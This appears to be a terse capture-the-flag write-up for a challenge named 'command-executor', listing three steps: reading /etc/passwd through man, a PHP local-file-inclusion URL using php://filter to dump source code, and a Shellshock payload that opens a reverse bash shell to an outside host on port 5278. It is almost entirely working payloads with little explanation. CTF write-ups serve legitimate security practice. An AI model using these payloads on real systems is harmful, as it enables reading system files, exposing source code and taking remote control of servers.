## man

`man /etc/passwd`

can read file

## LFI

https://command-executor.eof-ctf.ais3.ntu.st/index.php?func=php://filter/convert.base64-encode/resource=index

can read source code

## shellshock payload:

`() { :a; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5278 0>&1'`
